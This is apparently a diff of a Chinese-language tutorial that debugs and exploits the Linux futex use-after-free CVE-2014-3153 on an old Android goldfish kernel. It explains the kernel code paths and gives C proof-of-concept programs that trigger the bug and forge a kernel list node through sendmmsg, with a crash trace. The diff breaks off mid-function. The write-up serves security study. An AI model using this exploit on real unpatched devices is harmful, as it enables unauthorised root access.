@@ -2,102 +2,1313 @@ CVE-2014-3153漏洞调试过程
 
 通过实战调试CVE-2014-3153学习UAF内核漏洞利用
 
-# futex基础
-由于是futex相关的漏洞，因此需要先了解一下futex基础。
+# 简介
+
+## 概述
+该漏洞位于futex系统调用中，Futex(Fast Userspace Mutex)快速用户态互斥体，它是一种由用户态和内核态共同完成的同步机制。futex系统调用根据参数不同可以封装成几种不同的操作。
+其中futex_lock_pi/futex_wait_requeue_pi/futex_requeue等操作，在栈上定义了rt_waiter结构体变量，并有链表结构指向该结构体变量，经过构造特定的调用序列和参数，可以在内核中形成一个指向栈上的悬挂指针，这个指针原本指向rt_waiter变量，但实际上已经被释放。
+选择合适的内核函数调用(如sendmmsg，要求栈足够大，并且参数能够往栈上复制，以便控制栈上内容)，就能够在悬挂指针指向的内存布局构造rt_waiter结构，当再次调用futex_lock_pi就能够操作伪造的rt_waiter结构，通过链表操作，达到读写内核的目的。通过链表操作可以泄露内核栈地址，进而定位到thread_info结构，进一步定位到addr_limit地址，同样通过链表操作，可以改写addr_limit(需要多次改写)，最终达到任意写内核的目的，最终修改cred，达到提权目的。
+所以这个漏洞本质说是一个UAF漏洞(不过不同于传统的内核堆漏洞，是指向栈上的指针)
+
+## 难点提要
+- 涉及futex实现逻辑，本身逻辑比较复杂，又是涉及多线程，需要先对futex机制有所了解，并且需要阅读futex尤其futex_wait_requeue_pi/futex_requeue源码实现。
+- 通过遗留的指向栈上的悬挂指针，构造链表操作，实现内核读写(有限制的读写)
+- 从有限制的读写通过修改addr_limit到任意读写，需要多次操作
+
+# 环境搭建
+
+关键细节和命令简单列一下，具体环境搭建参考前面的文章
+编译依然使用goldfish3.4内核，并回退到未打补丁的状态：
+git clone https://aosp.tuna.tsinghua.edu.cn/kernel/goldfish.git -b goldfish3.4
+git checkout e8c92d268b8b8feb550ca8d24a92c1c98ed65ace kernel/futex.c
+编译需要配置arm交叉编译环境，并开启Compile the kernel with debug info 内核编译选项，细节参考前面文章
+
+# 漏洞利用原理概述
+
+## 触发流程
+先简单讲解一下触发漏洞的基本的5个步骤，方便接下来有针对性的阅读相关源码和调试相关流程：
+首先是在用户态定义两个int变量uaddr1,uaddr2，作为用户态的锁变量，按如下步骤可触发漏洞：
+1. 线程1调用futex_lock_pi锁住uaddr2，此时没有其他竞争，成功锁住uaddr2
+    syscall(__NR_futex, uaddr2, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
+2. 线程2调用futex_wait_requeue_pi(uaddr1,uaddr2)等待被唤醒：
+    syscall(__NR_futex, &uaddr1, FUTEX_WAIT_REQUEUE_PI, 1, 0, &uaddr2, uaddr1); //在uaddr1上等待
+3. 线程1调用futex_requeue(uaddr1,uaddr2)唤醒线程2。但由于lock2已经被线程1锁住，futex_requeue尝试获取uaddr2锁将失败，从而不能唤醒线程2。所以此时futex_requeue需要负责将线程2阻塞在uaddr2的rt_mutex上，同时将futex_wait_requeue_pi中的rt_waiter加入到rt_mutex的waiter list上
+    syscall(__NR_futex, &uaddr1, FUTEX_CMP_REQUEUE_PI, 1, 0, &uaddr2, uaddr1); //尝试获取uaddr2上的锁，然后唤醒uaddr1上等待的线程
+4. 在用户态将uaddr2赋值为0，这样下一步内核就以为是释放了uaddr2的锁。这时候线程2不会被唤醒，因为线程2是等待在rt_mutex上，已经进入内核互斥量中；
+5. 线程1调用futex_requeue(uaddr2, uaddr2)，此时uaddr2上的值为0，从而成功获得锁，并唤醒线程2。此时q->rt_waiter被赋值为NULL，表示不再需要rt_waiter。而线程2被唤醒之后，继续执行，并且因为此时q->rt_waiter已被赋值为NULL，会认为没有进入内核互斥量等等，也就不执行清理rt_waiter的分支代码。从而造成线程2被唤醒，但是它的rt_waiter没有从rt_mutex上摘除，而这个rt_waiter位于栈上，因此触发漏洞。
+    syscall(__NR_futex, &uaddr2, FUTEX_CMP_REQUEUE_PI, 1, 0, &uaddr2, uaddr2);
+
+其中涉及两个BUG：
+第4步中，在用户态将uaddr2置为0可以达到手工释放锁的目的。这样线程A先锁住uaddr，用户将uaddr值设为0，之后线程B再去锁住uaddr将成功获取该锁而不会阻塞。这时候线程A和线程B都拥有锁uaddr，从而形成relock漏洞。(uaddr是用户空间的整形变量，当其为0时说明没有线程占用，当线程获取到锁的时候，会将当前线程id写进去)。
+第5步中，所有地址都变成了uaddr2，也就是等待在uaddr2上的线程重排到uaddr2上，这是不合逻辑的，但futex没有检查这样的uaddr1==uaddr2的情况，从而造成了可以二次进入futex_requeue中进行唤醒操作。
+
+大致步骤参考如下(来源于参考链接)：
 
 
 
+接下来由于获得了指向栈上悬挂指针，我们通过内核调用，可以控制布局指针指向的栈内存，形成一个伪造的rt_waiter节点，使其前向和后项节点指针指向我们可以控制的用户态地址，接下来通过控制该节点的链表操作，可以达到读写内核的目的。
+
+## futex源码阅读
+以上大概描述了整个触发原理和流程，接下来阅读源码梳理一下整个过程，方便后面开发exploit过程中的内核调试
+
+这里主要关注：
+futex_lock_pi\futex_wait_requeue_pi\futex_requeue这几个调用
+
+以及涉及的结构体如下：
+struct futex_pi_state {
+    struct list_head list;
+    struct rt_mutex pi_mutex;
+    struct task_struct *owner;
+    atomic_t refcount;
+    union futex_key key;
+};
+
+futex队列hash entry
+struct futex_q {
+    struct plist_node list;
+    struct task_struct *task;
+    spinlock_t *lock_ptr;
+    union futex_key key;
+    struct futex_pi_state *pi_state;
+    struct rt_mutex_waiter *rt_waiter;
+    union futex_key *requeue_pi_key;
+    u32 bitset;
+};
+
+futex_key
+union futex_key {
+    struct {
+        unsigned long pgoff;
+        struct inode *inode;
+        int offset;
+    } shared;
+    struct {
+        unsigned long address;
+        struct mm_struct *mm;
+        int offset;
+    } private;
+    struct {
+        unsigned long word;
+        void *ptr;
+        int offset;
+    } both;
+};
+
+struct plist_node {
+    int prio;
+    struct list_head prio_list;
+    struct list_head node_list;
+};
+
+### futex_lock_pi调用源码阅读
+futex_lock_pi在触发第一步获取uaddr2锁，以及后续构造链表操作都用到了
+大概调用流程梳理如下：
+syscall(__NR_futex, &lock2, FUTEX_LOCK_PI, 1, 0, NULL, 0);
+    do_futex(&lock2, FUTEX_LOCK_PI, 1, 0, NULL, 0, 0);
+        futex_lock_pi(&lock2, FLAGS_SHARED, 1, 0, 0);
+            refill_pi_state_cache()                                                                                   // 检查current->pi_state_cache，为空则为其分配pi_state
+            get_futex_key(uaddr, flags & FLAGS_SHARED, &q.key, VERIFY_WRITE);
+                // 获取uaddr所在page，根据page读写等属性，填充key
+                key->both.offset |= FUT_OFF_MMSHARED; /* ref taken on mm */
+                key->private.mm = mm;
+                key->private.address = address;                                                               // 按PAGE_SIZE对齐
+            hb = queue_lock(&q);                                                                                  // 根据q->key获取对应的hash_bucket，并spin_lock该bucket
+            futex_lock_pi_atomic(uaddr, hb, &q.key, &q.pi_state, current, 0);
+                cmpxchg_futex_value_locked(&curval, uaddr, 0, newval)                            // 获取当前进程pid，并写入uaddr
+                // 发现curval为0，说明锁为空闲，成功获取锁，直接返回1，否则继续往下走
+                cmpxchg_futex_value_locked(&curval, uaddr, uval, newval))                       // 加上FUTEX_WAITERS再将原值写回去
+                ret = lookup_pi_state(uval, hb, key, ps);                                                   // 没能获取到锁，根据参数查询pi_state，如果是第一个等待者，则新建一个pi_state
+                   // 遍历hb->chain，查找key对应的futex_q，获取futex_q->pi_state，并通过参数ps返回
+                   // 如果遍历没找到，说明是第一个waiter
+                   p = futex_find_get_task(pid);                                                                // 查找uval对应task_struct
+                   pi_state = alloc_pi_state();                                                                   // 返回current->pi_statue，并置空current->pi_statue
+                   rt_mutex_init_proxy_locked(&pi_state->pi_mutex, p);                            // 初始化rt_mutex并置pi_mutex->owner
+                   list_add(&pi_state->list, &p->pi_state_list);                                           // 将p进程加入pi_state->list链表
+            queue_me(&q, hb);                                                                                     // 将q加入hb->chain中，q->list->prio = current->normal_prio，q->task = current
+            ret = rt_mutex_timed_lock(&q.pi_state->pi_mutex, to, 1);                            // 开始等待
+                rt_mutex_timed_fastlock(lock, TASK_INTERRUPTIBLE, timeout, detect_deadlock, rt_mutex_slowlock);
+                    rt_mutex_slowlock(lock, TASK_INTERRUPTIBLE, timeout, detect_deadlock)
+                        struct rt_mutex_waiter waiter;                                                        // rt_mutex_waiter定义在栈上
+                        debug_rt_mutex_init_waiter(&waiter);                                             // 初始化栈上rt_mutex_waiter
+                        try_to_take_rt_mutex(lock, current, NULL)                                       // 再次尝试获取锁，获取成功则返回
+                        // 获取失败则等待
+                        task_blocks_on_rt_mutex(lock, &waiter, current, detect_deadlock);
+                            plist_add(&waiter->list_entry, &lock->wait_list);                          // 将栈上的rt_mutex_waiter加入等待列表
+
+### futex_wait_requeue_pi源码阅读
+上面第2步，线程2阻塞在lock1上，等待requeue唤醒，调用了futex_wait_requeue_pi。在第5步时，又被唤醒继续完成该调用的后半部分。
+大概调用流程梳理如下：
+syscall(__NR_futex, &lock1, FUTEX_WAIT_REQUEUE_PI, 0, 0, &lock2, 0);
+    futex_wait_requeue_pi(&lock1, FLAGS_SHARED, 0, NULL, FUTEX_BITSET_MATCH_ANY, &lock2);
+        struct rt_mutex_waiter rt_waiter; // rt_waiter定义在栈上，并初始化
+        get_futex_key(uaddr2, flags & FLAGS_SHARED, &key2, VERIFY_WRITE);          // 查询uaddr2对应的key2
+        q.bitset = bitset;
+        q.rt_waiter = &rt_waiter;
+        q.requeue_pi_key = &key2;
+        futex_wait_setup(uaddr, val, flags, &q, &hb);                                                 // 访问uaddr值，看是否为预期值val，即0，并通过参数返回hb
+        futex_wait_queue_me(hb, &q, to);                                                                // 等待唤醒
+            set_current_state(TASK_INTERRUPTIBLE);
+            queue_me(q, hb);                                                                                   // 加入hb
+            freezable_schedule();                                                                              // 调度出去，等待唤醒
+            ...等待唤醒...
+            __set_current_state(TASK_RUNNING);                                                     // 唤醒后进入运行状态
+        handle_early_requeue_pi_wakeup(hb, &q, &key2, to);                                   // 检查唤醒原因:超时\信号\预期的requeue
+        // 如果是超时或信号，则跳出函数返回，否则继续往下
+        if (!q.rt_waiter) {                                                                                        // 检查requeue线程唤醒时q.rt_waiter是否为空
+            // q.rt_waiter为空，说明获取到了锁
+        } else {
+            // q.rt_waiter不为空，说明我们被 futex_unlock_pi()、超时或信号唤醒。
+            pi_mutex = &q.pi_state->pi_mutex;
+            ret = rt_mutex_finish_proxy_lock(pi_mutex, to, &rt_waiter, 1);                  // 完成锁获取
+                raw_spin_lock(&lock->wait_lock);
+                set_current_state(TASK_INTERRUPTIBLE);
+                __rt_mutex_slowlock(lock, TASK_INTERRUPTIBLE, to, waiter);
+                set_current_state(TASK_RUNNING);
+            unqueue_me_pi(&q);                                                                              // 将q从hb中摘除
+        }
+
+### futex_requeue源码阅读
+利用中涉及两次futex_requeue调用
+第3步中尝试唤醒线程2，并将所有阻塞在lock1上的进程移到lock2上。由于前面lock2被锁，这里获取lock2失败，将所有进程加入lock2的rt_waiter上，进入内核等待
+syscall(__NR_futex, &lock1, FUTEX_CMP_REQUEUE_PI, 1, 0, &lock2, lock1);
+    futex_requeue(&lock1, FLAGS_SHARED, &lock2, 1, 0, &(lock1), 1);
+第5步中，再次唤醒线程2，这时候参数都是lock2，即把lock2上的进程移到lock2上，这次可以唤醒成功。
+syscall(__NR_futex, &lock2, FUTEX_CMP_REQUEUE_PI, 1, 0, &lock2, lock2);
+    futex_requeue(&lock2, FLAGS_SHARED, &lock2, 1, 0, &(lock2), 1);
+
+大概调用流程梳理如下：
+syscall(__NR_futex, &lock1, FUTEX_CMP_REQUEUE_PI, 1, 0, &lock2, lock1);
+    futex_requeue(&lock1, FLAGS_SHARED, &lock2, 1, 0, &(lock1), 1);
+        refill_pi_state_cache()                                                                              // 分配一个pi_state
+        ret = get_futex_key(uaddr1, flags & FLAGS_SHARED, &key1, VERIFY_READ);
+        ret = get_futex_key(uaddr2, flags & FLAGS_SHARED, &key2, VERIFY_WRITE);
+        hb1 = hash_futex(&key1);
+        hb2 = hash_futex(&key2);
+        double_lock_hb(hb1, hb2);
+        get_futex_value_locked(&curval, uaddr1);                                                  // 直接获取uaddr1值并比较传入的uaddr1值，不一致则返回出错
+
+        if (requeue_pi && (task_count - nr_wake < nr_requeue)) {
+            // 尝试获取uaddr2并唤醒top waiter
+            ret = futex_proxy_trylock_atomic(uaddr2, hb1, hb2, &key1, &key2, &pi_state, nr_requeue);
+                get_futex_value_locked(&curval, pifutex)                                         // 获取uaddr2的值
+                top_waiter = futex_top_waiter(hb1, key1);                                      // 获取uaddr1的top waiter
+                futex_lock_pi_atomic(pifutex, hb2, key2, ps, top_waiter->task, set_waiters);     // 前面分析过，就是判断当前是否等待，无等待则返回1，即成功获取锁lock2
+                // 如果获取锁成功，唤醒top_waiter->task
+                requeue_pi_wake_futex(top_waiter, key2, hb2);
+                    __unqueue_futex(q);
+                    wake_up_state(q->task, TASK_NORMAL);
+            if (ret == 1) {                                                                                   // 如果这里获取锁成功，则查找lock2对应的pi_state
+                drop_count++;
+                task_count++;
+                ret = lookup_pi_state(curval2, hb2, &key2, &pi_state);                    // 第二次调用requeue时返回EINVAL退出
+            }
+        }
+
+        // 下面循环遍历lock1上的等待进程，依次获取lock2上的锁(pi_state->pi_mutex)，并将futex_q挂在lock2上
+        head1 = &hb1->chain;
+        plist_for_each_entry_safe(this, next, head1, list) {
+            if (task_count - nr_wake >= nr_requeue)
+                break;
+            if (requeue_pi) {
+                /* Prepare the waiter to take the rt_mutex. */
+                atomic_inc(&pi_state->refcount);
+                this->pi_state = pi_state;
+                ret = rt_mutex_start_proxy_lock(&pi_state->pi_mutex, this->rt_waiter, this->task, 1);      // 将进程等待在pi_mutex上，加入等待列表
+                    task_blocks_on_rt_mutex(lock, waiter, task, detect_deadlock);
+                        plist_add(&waiter->list_entry, &lock->wait_list); // !!!!!
+                if (ret == 1) {
+                    /* We got the lock. */
+                    requeue_pi_wake_futex(this, &key2, hb2);
+                        q->rt_waiter = NULL; // !!!!!
+                    drop_count++;
+                }
+            }
+            requeue_futex(this, hb1, hb2, &key2);                                              // 将futex_q从hb1上移除，移到hb2上去
+            drop_count++;
+        }
+    }
+
+# exploit开发和调试
+
+经过上述源码阅读，已经大概清楚了调用流程，有些细节可能还没有太理清，没关系，带着疑问直接调试内核。
+
+## exploit源码阅读
+鉴于该漏洞利用较为复杂，直接先研究现有exploit。网上流传有多个版本，例如：
+版本1: https://github.com/timwr/CVE-2014-3153
+版本2: https://www.exploit-db.com/download/35370
+
+这里选取第一个来研究，经过代码阅读，关键利用流程梳理如下：
+(其中有些细节开始也没理很清楚，尤其后面的链表控制部分，是经过后续调试之后重新梳理的)
+1. 先mmap一段内存，用于后续在用户态伪造链表节点，控制内核读写。
+    其中作者是mmap了两段内存，是后续提高适配通用性，选择其中一个mmap来用，只是为了调试学习，可以先只mmap一个
+2. 先启动3个线程:
+    pthread_create(&t0, NULL, accept_socket, NULL);  // accept_socket线程
+    pthread_create(&t1, NULL, trigger, NULL);             // 线程1
+
+    pthread_create(&t2, NULL, stack_modifier, NULL); // 线程2
+    其中accept_socket线程用于执行accept_socket函数，因为后面需要sendmmsg来构造内核栈，为了调用sendmmsg需要先创建一个接收端。
+    重点看线程1和线程2。线程1用于执行trigger触发漏洞、构造链表、定位并修改addr_limit和cred。线程2用于执行stack_modifier等待唤醒和构造内核栈。
+3. 线程1调整优先级为12，调用futex_lock_pi锁住lock2
+     线程2调整优先级为5，创建socket并connect，然后调用futex_wait_requeue_pi等待被唤醒
+     这一步两线程并行状态运行
+4. 线程1调用futex_cmp_requeue_pi(lock1,lock2)尝试唤醒线程2，但此时lock2被锁住导致唤醒失败，但是会将线程2阻塞在lock2上，并将栈上的rt_waiter挂在rt_mutex的wait_list上
+5. 线程1修改lock2=0，从用户态解锁lock2
+6. 依次创建3个新线程，优先级分别设为3，6，7，并通过调用futex_lock_pi(lock2)来将相应的rt_waiter插入链表中
+    (这里之所以先创建几个新线程，是为了先创建几个rt_waiter节点，不然下一步获取锁的时候会重新创建一个mutex，利用会失败。另外注意到，每创建一个线程，就对应的创建一个rt_waiter节点，后面也是通过这个方式来创建节点并控制内核读写的)
+
+7. 线程1再次调用futex_cmp_requeue_pi(lock2,lock2)，这次由于lock2已被解锁，所以获取lock2锁成功，并成功唤醒线程2，并将q->rt_waiter赋值为NULL，但是没有将栈上的rt_waiter从rt_mutex摘除。
+8. 线程2被唤醒后调用sendmmsg构造内核栈，使原本指向栈上的指针指向伪造的内核栈节点，并且伪造节点的下一节点指向mmap出的内存上(稍后将在这里伪造节点)。
+9. 线程1在最开始mmap出的内存上伪造节点，并创建一个线程，设置优先级11，并在线程内调用futex_lock_pi(lock2)来插入链表，新节点将能插入到用户态伪造节点上，通过查看伪造节点next指针，将能泄露该线程对应的rt_waiter节点的内核地址。由于该节点位于栈上，所以将该地址与0xffffe000与操作就可以得到thread_info结构体地址，进一步可以得到addr_limit地址。(addr_limit正常情况下为0xbf000000，即限定用户态地址范围为0~0xbf000000)
+10. 得到该addr_limit地址后，重新伪造两个用户态节点，并将其中的prev指针指向addr_limit，再次创建一个新线程，设置优先级为12，同样在线程内调用futex_lock_pi(lock2)来插入链表。这样链表插入之后，addr_limit将被改写为新的rt_waiter地址，这样用户态地址将被扩大到0xc0000000以上，具体范围由该线程的rt_waiter地址确定。
+11. 经过上诉链表操作，成功扩大了用户态可访问的地址范围，但可能还不够。所以可以循环多次，重置用户态节点，并创建新线程，用于泄露新线程的栈地址，进一步定位其addr_limit地址，如果新线程的addr_limit地址位于上一步线程可访问的范围内，则停止循环，并通知上一步的线程，来修改当前线程的addr_limit为0xffffffff，否则则继续循环创建新线程，直到找到符合条件的目标线程。当当前线程被改成了0xffffffff之后，当前线程就有了访问整个内核空间的能力。
+12. 接下来就通知当前线程查找相应的task_struct->cred，并修改cred的uid和capibility实现提权。
 
 
+## 实战调试与exploit开发
+结合已有的exploit，和前面梳理的信息，重新进行exploit开发调试。
 
+1. 首先根据漏洞触发基本流程，构建简单POC，参考futex_poc.c
+创建两个线程，分别做futex调用，执行关键的5个流程，触发栈上的uaf，进程退出时，触发panic，说明漏洞存在。
 
-# 参考
-(1). futex基础
-http://blog.chinaunix.net/uid-7295895-id-3011238.html
-
-
-
-
-
-#include <unistd.h>
+#define _GNU_SOURCE
+#include <stdlib.h>
+#include <stdio.h>
+#include <pthread.h>
 #include <sys/syscall.h>
+#include <linux/futex.h>
+#include <unistd.h>
+
+int lock1, lock2;
+
+static void *thread_func1(void *arg)
+{
+int ret;
+printf("thread_func1 start\n");
+// STEP1
+printf("STEP1: thread1 lock on lock2\n");
+syscall(__NR_futex, &lock2, FUTEX_LOCK_PI, 1, 0, NULL, 0);
+sleep(1);
+// STEP3
+printf("STEP3: thread1 try to requeue thread2 to lock2 (will fail)\n");
+ret = syscall(__NR_futex, &lock1, FUTEX_CMP_REQUEUE_PI, 1, 0, &lock2, lock1);
+printf("ret=%d\n", ret);
+// STEP4
+printf("STEP4: clean lock1 in userspace\n");
+printf("lock2=0x%08x\n", lock2);
+lock2 = 0;
+// STEP5
+printf("STEP5: thread1 try to requeue thread2 from lock2 to lock2 (RELOCK)\n");
+ret = syscall(__NR_futex, &lock2, FUTEX_CMP_REQUEUE_PI, 1, 0, &lock2, lock2);
+printf("ret=%d\n", ret);
+
+return NULL;
+}
+
+static void *thread_func2(void *arg)
+{
+printf("thread_func2 start\n");
+// STEP2
+printf("STEP2: thread2 wait requeue\n");
+syscall(__NR_futex, &lock1, FUTEX_WAIT_REQUEUE_PI, 0, 0, &lock2, 0);
+
+
+return NULL;
+}
+
+int main(int argc, char *argv[])
+{
+pthread_t p1, p2;
+
+pthread_create(&p1, NULL, thread_func1, NULL);
+pthread_create(&p2, NULL, thread_func2, NULL);
+
+pthread_join(p1, NULL);
+pthread_join(p2, NULL);
+return 0;
+}
+
+2. 参考前面的POC，对POC进行进一步扩展，添加上socket创建及sendmmsg调用，用于布局栈空间控制栈上的rt_waiter指针，参考futex_plist.c
+这里没有对sendmmsg栈空间做过多分析，直接拿POC上的构造方法。
+运行poc，触发如下panic，挂在plist_add中，说明成功控制到rt_waiter指针，从而控制链表操作。
+
+[<c01da5bc>] (plist_add+0xb8/0xdc) from [<c00537a8>] (task_blocks_on_rt_mutex+0xb0/0x1f4)
+[<c00537a8>] (task_blocks_on_rt_mutex+0xb0/0x1f4) from [<c0371a40>] (rt_mutex_slowlock+0xf0/0x184)
+[<c0371a40>] (rt_mutex_slowlock+0xf0/0x184) from [<c00520a8>] (futex_lock_pi.isra.10+0x1f4/0x304)
+[<c00520a8>] (futex_lock_pi.isra.10+0x1f4/0x304) from [<c0052f7c>] (do_futex+0x98c/0xa24)
+[<c0052f7c>] (do_futex+0x98c/0xa24) from [<c0053138>] (sys_futex+0x124/0x168)
+[<c0053138>] (sys_futex+0x124/0x168) from [<c000d840>] (ret_fast_syscall+0x0/0x30)
+Code: e5923008 e5826008 e2822004 e984000c (e5836000) 
+---[ end trace f3d6a53201f24e78 ]---
+
+#define _GNU_SOURCE
+#include <stdlib.h>
+#include <stdio.h>
+#include <pthread.h>
+#include <arpa/inet.h>
+#include <sys/mman.h>
+#include <sys/resource.h>
+#include <sys/socket.h>
+#include <sys/syscall.h>
+#include <sys/time.h>
 #include <sys/types.h>
 #include <linux/futex.h>
+#include <unistd.h>
 
-/**
- * futex() - SYS_futex syscall wrapper
- * @uaddr:	address of first futex
- * @op:		futex op code
- * @val:	typically expected value of uaddr, but varies by op
- * @timeout:	typically an absolute struct timespec (except where noted
- *		otherwise). Overloaded by some ops
- * @uaddr2:	address of second futex for some ops\
- * @val3:	varies by op
- * @opflags:	flags to be bitwise OR'd with op, such as FUTEX_PRIVATE_FLAG
- *
- * futex() is used by all the following futex op wrappers. It can also be
- * used for misuse and abuse testing. Generally, the specific op wrappers
- * should be used instead. It is a macro instead of an static inline function as
- * some of the types over overloaded (timeout is used for nr_requeue for
- * example).
- *
- * These argument descriptions are the defaults for all
- * like-named arguments in the following wrappers except where noted below.
- */
-#define futex(uaddr, op, val, timeout, uaddr2, val3, opflags) \
-	syscall(SYS_futex, uaddr, op | opflags, val, timeout, uaddr2, val3)
+#define PORT 7331
 
-/**
- * futex_wait() - block on uaddr with optional timeout
- * @timeout:	relative timeout
- */
-static inline int
-futex_wait(u_int32_t *uaddr, u_int32_t val, struct timespec *timeout, int opflags)
+int lock1, lock2;
+int config_iovstack = 2;
+void *addr1, *addr2;
+unsigned long fake_node1, fake_node2;
+
+int connect_server(void)
 {
-	return futex(uaddr, FUTEX_WAIT, val, timeout, NULL, 0, opflags);
+int opt;
+int sock;
+struct sockaddr_in addr = {0};
+
+sock = socket(AF_INET, SOCK_STREAM, SOL_TCP);
+if (sock < 0) {
+printf("socket() failed");
+return -1;
+ }
+addr.sin_family = AF_INET;
+addr.sin_port = htons(PORT);
+addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
+
+while (1) {
+if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) >= 0)
+break;
+usleep(10);
+ }
+
+opt = 1;
+setsockopt(sock, SOL_SOCKET, SO_SNDBUF, (char *)&opt, sizeof(opt));
+return sock;
 }
 
-/**
- * futex_wake() - wake one or more tasks blocked on uaddr
- * @nr_wake:	wake up to this many tasks
- */
-static inline int
-futex_wake(u_int32_t *uaddr, int nr_wake, int opflags)
+static void *thread_waiter(void *arg)
 {
-	return futex(uaddr, FUTEX_WAKE, nr_wake, NULL, NULL, 0, opflags);
+int ret;
+int prio = (int)arg;
+
+setpriority(PRIO_PROCESS, 0, prio);
+
+printf("thread_waiter start, tid=%x, prio=%d\n", gettid(), prio);
+ret = syscall(__NR_futex, &lock2, FUTEX_LOCK_PI, 1, 0, NULL, 0);
+printf("thread_waiter exit, tid=%x", gettid());
+
+return NULL;
 }
 
-/**
- * futex_lock_pi() - block on uaddr as a PI mutex
- */
-static inline int
-futex_lock_pi(u_int32_t *uaddr, struct timespec *timeout, int opflags)
+int create_waiter(int prio)
 {
-	return futex(uaddr, FUTEX_LOCK_PI, 0, timeout, NULL, 0, opflags);
+pthread_t t;
+
+pthread_create(&t, NULL, thread_waiter, (void *)prio);
+return 0;
 }
 
-/**
- * futex_unlock_pi() - release uaddr as a PI mutex, waking the top waiter
- */
-static inline int
-futex_unlock_pi(u_int32_t *uaddr, int opflags)
+static void *thread_func1(void *arg)
 {
-	return futex(uaddr, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0, opflags);
+int ret;
+printf("thread_func1 start, tid=%x\n", gettid());
+// STEP1
+printf("STEP1: thread1 lock on lock2\n");
+syscall(__NR_futex, &lock2, FUTEX_LOCK_PI, 1, 0, NULL, 0);
+sleep(1);
+// STEP3
+printf("STEP3: thread1 try to requeue thread2 to lock2 (will fail)\n");
+ret = syscall(__NR_futex, &lock1, FUTEX_CMP_REQUEUE_PI, 1, 0, &lock2, lock1);
+printf("ret=%d\n", ret);
+
+// Q&A: why should we add waiter before requeue thread2?
+create_waiter(3);
+create_waiter(7);
+sleep(1);
+
+// STEP4
+printf("STEP4: clean lock1 in userspace\n");
+printf("lock2=0x%08x\n", lock2);
+lock2 = 0;
+
+// STEP5
+printf("STEP5: thread1 try to requeue thread2 from lock2 to lock2 (RELOCK)\n");
+ret = syscall(__NR_futex, &lock2, FUTEX_CMP_REQUEUE_PI, 1, 0, &lock2, lock2);
+printf("ret=%d\n", ret);
+
+create_waiter(11);
+create_waiter(13);
+printf("thread1 goto loop...\n");
+while(1)
+sleep(100);
+return NULL;
 }
 
-/**
-* futex_cmp_requeue() - requeue tasks from uaddr to uaddr2
-* @nr_wake:        wake up to this many tasks
-* @nr_requeue:        requeue up to this many tasks
-*/
-static inline int
-futex_cmp_requeue(u_int32_t *uaddr, u_int32_t val, u_int32_t *uaddr2, int nr_wake,
-		 int nr_requeue, int opflags)
+static void *thread_func2(void *arg)
 {
-	return futex(uaddr, FUTEX_CMP_REQUEUE, nr_wake, nr_requeue, uaddr2,
-		 val, opflags);
+int i, ret;
+int sock;
+struct mmsghdr msgvec[1];
+struct iovec msg_iov[8];
+unsigned long databuf[0x20];
+
+printf("thread_func2 start, tid=%x\n", gettid());
+
+setpriority(PRIO_PROCESS, 0, 12);
+
+for (i = 0; i < 0x20; i++) {
+databuf[i] = fake_node1;
+ }
+
+for (i = 0; i <= 8; i++) {
+msg_iov[i].iov_base = (void *)fake_node1;
+msg_iov[i].iov_len = 0x80;
+ }
+
+//msg_iov[IOVSTACK_TARGET] will be our new waiter.
+// iov_len must be large enough to fill the socket kernel buffer to avoid the sendmmsg to return.
+
+msg_iov[config_iovstack].iov_base = (void *)fake_node1;
+msg_iov[config_iovstack].iov_len = fake_node2;
+
+// The new waiter will be something like that:
+// prio = hacket_node
+// prio_list->next = fake_node_alt
+// prio_list->prev = fake_node
+// node_list->next = 0x7d
+// node_list->prev = fake_node
+
+// hacked_node will be somethin < 0 so a negative priority
+
+msgvec[0].msg_hdr.msg_name = databuf;
+msgvec[0].msg_hdr.msg_namelen = 0x80;
+msgvec[0].msg_hdr.msg_iov = msg_iov;
+msgvec[0].msg_hdr.msg_iovlen = 8;
+msgvec[0].msg_hdr.msg_control = databuf;
+msgvec[0].msg_hdr.msg_controllen = 0x20;
+msgvec[0].msg_hdr.msg_flags = 0;
+msgvec[0].msg_len = 0;
+
+sock = connect_server();
+if (sock == -1) {
+printf("connect_server() failed\n");
+return NULL;
+ }
+printf("connect_server success\n");
+
+// STEP2
+printf("STEP2: thread2 wait requeue\n");
+syscall(__NR_futex, &lock1, FUTEX_WAIT_REQUEUE_PI, 0, 0, &lock2, 0);
+
+//printf("thread2 awaked by requeue\n");
+
+ret = syscall(__NR_sendmmsg, sock, msgvec, 1, 0);
+
+printf("modify stack ret = %d", ret);
+
+printf("thread2 goto loop...\n");
+while(1)
+sleep(100);
+return NULL;
+}
+
+int main(int argc, char *argv[])
+{
+int opt;
+int sock;
+pthread_t p1, p2;
+struct sockaddr_in addr = {0};
+
+addr1 = mmap((void *)0x100000, 0x110000, PROT_READ|PROT_WRITE|PROT_EXEC,
+ MAP_SHARED|MAP_FIXED|MAP_ANONYMOUS, -1, 0);
+if (addr1 == MAP_FAILED) {
+printf("mmap failed, err=%d\n", errno);
+return -1;
+ }
+
+addr2 = mmap((void *)0x200000, 0x110000, PROT_READ|PROT_WRITE|PROT_EXEC,
+ MAP_SHARED|MAP_FIXED|MAP_ANONYMOUS, -1, 0);
+if (addr2 == MAP_FAILED) {
+printf("mmap failed, err=%d\n", errno);
+return -1;
+ }
+fake_node1 = (unsigned long)addr1 + 0x1000;
+fake_node2 = (unsigned long)addr2 + 0x1000;
+
+pthread_create(&p1, NULL, thread_func1, NULL);
+pthread_create(&p2, NULL, thread_func2, NULL);
+
+sock = socket(AF_INET, SOCK_STREAM, SOL_TCP);
+if (sock < 0) {
+printf("socket create fail, err=%d\n", errno);
+goto err;
+ }
+opt = 1;
+setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, (char *)&opt, sizeof(opt));
+opt = 1;
+setsockopt(sock, SOL_SOCKET, SO_RCVBUF, (char *)&opt, sizeof(opt));
+
+addr.sin_family = AF_INET;
+addr.sin_port = htons(PORT);
+addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
+
+if (bind(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
+printf("socket bind fail, err=%d\n", errno);
+goto err;
+ }
+
+if (listen(sock, 1) < 0) {
+printf("socket listen fail, err=%d\n", errno);
+goto err;
+ }
+
+while (1) {
+if (accept(sock, NULL, NULL) < 0) {
+printf("socket accept fail, err=%d\n", errno);
+goto err;
+ } else {
+printf("socket accept success!\n");
+ }
+ }
+
+err:
+pthread_join(p1, NULL);
+pthread_join(p2, NULL);
+
